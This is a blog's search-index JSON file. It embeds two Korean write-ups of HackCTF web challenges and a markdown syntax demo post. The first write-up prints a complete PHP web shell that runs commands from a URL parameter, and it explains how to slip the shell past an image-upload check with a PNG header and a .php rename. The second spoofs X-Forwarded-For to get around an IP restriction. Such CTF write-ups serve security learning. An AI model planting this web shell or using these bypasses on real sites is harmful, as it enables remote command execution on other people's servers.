{"componentChunkName":"component---src-pages-search-js","path":"/search/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"excerpt":"HackCTF - WEB - 가위바위보 일단 문제 사이트에 접속을 합니다.  접속을 하면 간단한 가위바위보 게임을 즐길 수 있는 사이트가 하나 나오는데 여기서 오른쪽 위의 계정 설정으로 들어갑니다.!  그러면 계정에 대해 프로필 이미지와 이름을 변경할 수 있는 것을 보이는데 파일 업로드가 가능 하다는 점에서 파일 업로드 취약점을 이용 해야 한다는 것을 알…","rawMarkdownBody":"# HackCTF - WEB - 가위바위보\r\n\r\n일단 문제 사이트에 접속을 합니다.\r\n\r\n![image-20191210202755946](image/HackCTF - WEB - 가위바위보/image-20191210202755946.png)\r\n\r\n접속을 하면 간단한 가위바위보 게임을 즐길 수 있는 사이트가 하나 나오는데 여기서 오른쪽 위의 계정 설정으로 들어갑니다.!\r\n\r\n![image-20191210202853478](image/HackCTF - WEB - 가위바위보/image-20191210202853478.png)\r\n\r\n그러면 계정에 대해 프로필 이미지와 이름을 변경할 수 있는 것을 보이는데 파일 업로드가 가능 하다는 점에서 파일 업로드 취약점을 이용 해야 한다는 것을 알 수 있습니다. 일단 한번 간단한 웹쉘 코드를 짜고 업로드를 해봅니다.\r\n\r\n```php\r\n<html>\r\n<body>\r\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\r\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\r\n<input type=\"SUBMIT\" value=\"Execute\">\r\n</form>\r\n<pre>\r\n<?php\r\n    if(isset($_GET['cmd']))\r\n    {\r\n        system($_GET['cmd']);\r\n    }\r\n?>\r\n</pre>\r\n</body>\r\n<script>document.getElementById(\"cmd\").focus();</script>\r\n</html>\r\n```\r\n\r\n위와 같이 웹쉘을 제작 해서 파일을 업로드 해봅니다.!\r\n\r\nwebshell.php , webshell.png.php, webshell.php%00.png 등등 확장자를 변경하여 시도를 하였는데 아래와 같이 이미지 파일이 아니라는 경고를 내보내는 모습을 볼 수 있습니다.\r\n\r\n![image-20191210203401282](image/HackCTF - WEB - 가위바위보/image-20191210203401282.png)\r\n\r\n이번에는 파일 헤더에 PNG을 의미하는 헤더를 집어 넣음으로 한번 우회를 해봅니다.\r\n\r\n![image-20191210203617292](image/HackCTF - WEB - 가위바위보/image-20191210203617292.png)\r\n\r\n이제 수정한 파일을 업로드 해보면 정상적으로 업로드가 되는 모습을 알 수 있습니다.\r\n\r\n![image-20191210203716410](image/HackCTF - WEB - 가위바위보/image-20191210203716410.png)\r\n\r\n이때 파일을 열어보면 아래와 같이 이름으로 열리는 모습을 볼 수 있는데 이름을 .php의 확장자 이름으로 변경하여 다시 업로드 해봅니다.\r\n\r\n![image-20191210203730274](image/HackCTF - WEB - 가위바위보/image-20191210203730274.png)\r\n\r\n![image-20191210203840049](image/HackCTF - WEB - 가위바위보/image-20191210203840049.png)\r\n\r\n이제 여기서 이미지의 주소를 새 창으로 띄어 보면 정상적으로 웹쉘이 실행된 모습을 볼 수 있는데 flag 파일을 찾아 출력 합니다.\r\n\r\n![image-20191210204043068](image/HackCTF - WEB - 가위바위보/image-20191210204043068.png)\r\n","fields":{"slug":"/HackCTF - WEB - 가위바위보/"},"frontmatter":{"date":"April 05 2020","title":"HackCTF - WEB - 가위바위보","tags":["web","HackCTF","ctf"]}}},{"node":{"excerpt":"HackCTF - WEB - Home 일단 문제 사이트에 접근을 하면 아래와 같은 화면으로 IP 주소에 대해 검증을 하여 접근 제한을 하는 모습을 볼 수 있습니다.  이때 머리말을 생각 해보라고 힌트를 주는데 이떄의 머리말은 HTTP의 Header에 대해 이야기 하는 것이고 예전에 풀었던 RITSEC CTF의 문제와 같이 X-Forwarded-For 를 …","rawMarkdownBody":"# HackCTF - WEB - Home\r\n\r\n일단 문제 사이트에 접근을 하면 아래와 같은 화면으로 IP 주소에 대해 검증을 하여 접근 제한을 하는 모습을 볼 수 있습니다.\r\n\r\n![image-20191210201522512](image/HackCTF - WEB - Home/image-20191210201522512.png)\r\n\r\n이때 머리말을 생각 해보라고 힌트를 주는데 이떄의 머리말은 HTTP의 Header에 대해 이야기 하는 것이고 예전에 풀었던 RITSEC CTF의 문제와 같이 **X-Forwarded-For** 를 이용하는 것을 알 수 있습니다. 이제 한번 패킷을 전송해봅니다.\r\n\r\n```http\r\nGET / HTTP/1.1\r\nHost: ctf.j0n9hyun.xyz:2034\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nX-Forwarded-For: 127.0.0.1 // 루프백 주소를 전달\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.146 Whale/2.6.89.9 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: _ga=GA1.2.1648668259.1573465863; _gid=GA1.2.1890637559.1575894614; Cookie=WlhsS2NGcERTVFpKYWtscFRFTktNR1ZZUW14SmFtOXBXak5XYkdNelVXbG1VVDA5; PHPSESSID=rmsjabjhdvlhu8cp8bsa995p45; session=.eJwNz7FugzAQANBfqW5mwA7pgNShFSQK1RlR2bHOGwUqsDkiFVUBovx72d_yHlC3PEyQ_tTj3EUwtJAKKV4jmG5T00H6gJdvSKHU16BkdcTMxMTFqDwdFJ9CafOYNIkyC6s7V6uyF4m2Eko6xvNp3C0773pl843kRaA0d9IFl_o9Qc4FekrImtjpJkHf90pfGXVzQI-Lyj6C021w_mtQTCsy7sas5MPR2XxRuyFtFvSqx6wfaDN3tdEbPCP4m7vfqeY9AEXdzd3tc2B4_gM2Xk4a.EM_P2A.Gx4Mr9GrGMSRPs5hUMFmOdKw-Es; PassAdmin=j0n9hyun\r\nConnection: close\r\n```\r\n\r\n이제 결과를 보면 아래와 같이 플래그가 출력 되는 것을 볼 수 있습니다.\r\n\r\n![image-20191210202100635](image/HackCTF - WEB - Home/image-20191210202100635.png)\r\n","fields":{"slug":"/HackCTF - WEB - Home/"},"frontmatter":{"date":"April 05 2020","title":"HackCTF - WEB - Home","tags":["web","HackCTF","ctf"]}}},{"node":{"excerpt":"Advertisement :) pica - high quality and fast image\nresize in browser. babelfish - developer friendly\ni18n with plurals support and easy syntax. You will like those projects! h1 Heading 8-) h2 Headin…","rawMarkdownBody":"---\n__Advertisement :)__\n\n- __[pica](https://nodeca.github.io/pica/demo/)__ - high quality and fast image\n  resize in browser.\n- __[babelfish](https://github.com/nodeca/babelfish/)__ - developer friendly\n  i18n with plurals support and easy syntax.\n\nYou will like those projects!\n\n---\n\n# h1 Heading 8-)\n## h2 Heading\n### h3 Heading\n#### h4 Heading\n##### h5 Heading\n###### h6 Heading\n\n`test`\n\n## Horizontal Rules\n\n___\n\n---\n\n***\n\n\n## Typographic replacements\n\nEnable typographer option to see result.\n\n(c) (C) (r) (R) (tm) (TM) (p) (P) +-\n\ntest.. test... test..... test?..... test!....\n\n!!!!!! ???? ,,  -- ---\n\n\"Smartypants, double quotes\" and 'single quotes'\n\n\n## Emphasis\n\n**This is bold text**\n\n__This is bold text__\n\n*This is italic text*\n\n_This is italic text_\n\n~~Strikethrough~~\n\n\n## Blockquotes\n\n\n> Blockquotes can also be nested...\n>> ...by using additional greater-than signs right next to each other...\n> > > ...or with spaces between arrows.\n\n\n## Lists\n\nUnordered\n\n+ Create a list by starting a line with `+`, `-`, or `*`\n+ Sub-lists are made by indenting 2 spaces:\n  - Marker character change forces new list start:\n    * Ac tristique libero volutpat at\n    + Facilisis in pretium nisl aliquet\n    - Nulla volutpat aliquam velit\n+ Very easy!\n\nOrdered\n\n1. Lorem ipsum dolor sit amet\n2. Consectetur adipiscing elit\n3. Integer molestie lorem at massa\n\n\n1. You can use sequential numbers...\n1. ...or keep all the numbers as `1.`\n\nStart numbering with offset:\n\n57. foo\n1. bar\n\n\n## Code\n\nInline `code`\n\nIndented code\n\n    // Some comments\n    line 1 of code\n    line 2 of code\n    line 3 of code\n\n\nBlock code \"fences\"\n\n```\nSample text here...\n```\n\nSyntax highlighting\n\n``` js\nvar foo = function (bar) {\n  return bar++;\n};\n\nconsole.log(foo(5));\n```\n\n## Tables\n\n| Option | Description |\n| ------ | ----------- |\n| data   | path to data files to supply the data that will be passed into templates. |\n| engine | engine to be used for processing templates. Handlebars is the default. |\n| ext    | extension to be used for dest files. |\n\nRight aligned columns\n\n| Option | Description |\n| ------:| -----------:|\n| data   | path to data files to supply the data that will be passed into templates. |\n| engine | engine to be used for processing templates. Handlebars is the default. |\n| ext    | extension to be used for dest files. |\n\n\n## Links\n\n[link text](http://dev.nodeca.com)\n\n[link with title](http://nodeca.github.io/pica/demo/ \"title text!\")\n\nAutoconverted link https://github.com/nodeca/pica (enable linkify to see)\n\n\n## Images\n\n![Minion](https://octodex.github.com/images/minion.png)\n![Stormtroopocat](https://octodex.github.com/images/stormtroopocat.jpg \"The Stormtroopocat\")\n\nLike links, Images also have a footnote style syntax\n\n![Alt text][id]\n\nWith a reference later in the document defining the URL location:\n\n[id]: https://octodex.github.com/images/dojocat.jpg  \"The Dojocat\"\n\n\n## Plugins\n\nThe killer feature of `markdown-it` is very effective support of\n[syntax plugins](https://www.npmjs.org/browse/keyword/markdown-it-plugin).\n\n\n### [Emojies](https://github.com/markdown-it/markdown-it-emoji)\n\n> Classic markup: :wink: :crush: :cry: :tear: :laughing: :yum:\n>\n> Shortcuts (emoticons): :-) :-( 8-) ;)\n\nsee [how to change output](https://github.com/markdown-it/markdown-it-emoji#change-output) with twemoji.\n\n\n### [Subscript](https://github.com/markdown-it/markdown-it-sub) / [Superscript](https://github.com/markdown-it/markdown-it-sup)\n\n- 19^th^\n- H~2~O\n\n\n### [\\<ins>](https://github.com/markdown-it/markdown-it-ins)\n\n++Inserted text++\n\n\n### [\\<mark>](https://github.com/markdown-it/markdown-it-mark)\n\n==Marked text==\n\n\n### [Footnotes](https://github.com/markdown-it/markdown-it-footnote)\n\nFootnote 1 link[^first].\n\nFootnote 2 link[^second].\n\nInline footnote^[Text of inline footnote] definition.\n\nDuplicated footnote reference[^second].\n\n[^first]: Footnote **can have markup**\n\n    and multiple paragraphs.\n\n[^second]: Footnote text.\n\n\n### [Definition lists](https://github.com/markdown-it/markdown-it-deflist)\n\nTerm 1\n\n:   Definition 1\nwith lazy continuation.\n\nTerm 2 with *inline markup*\n\n:   Definition 2\n\n        { some code, part of Definition 2 }\n\n    Third paragraph of definition 2.\n\n_Compact style:_\n\nTerm 1\n  ~ Definition 1\n\nTerm 2\n  ~ Definition 2a\n  ~ Definition 2b\n\n\n### [Abbreviations](https://github.com/markdown-it/markdown-it-abbr)\n\nThis is HTML abbreviation example.\n\nIt converts \"HTML\", but keep intact partial entries like \"xxxHTMLyyy\" and so on.\n\n*[HTML]: Hyper Text Markup Language\n\n### [Custom containers](https://github.com/markdown-it/markdown-it-container)\n\n::: warning\n*here be dragons*\n:::\n","fields":{"slug":"/test/"},"frontmatter":{"date":"April 05 2020","title":"test","tags":["markdown","test"]}}}]}},"pageContext":{}},"staticQueryHashes":["63159454"]}